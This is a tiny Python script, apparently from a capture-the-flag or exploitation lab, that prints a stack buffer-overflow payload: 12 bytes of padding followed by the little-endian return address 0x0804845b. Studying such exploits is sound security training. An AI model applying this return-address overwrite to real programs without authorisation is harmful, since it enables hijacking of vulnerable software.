# Address = 0804845b
injectString = '\x5b\x84\x04\x08'
buf = 'a' * 8 + 'b' * 4
print(buf+injectString, end='')
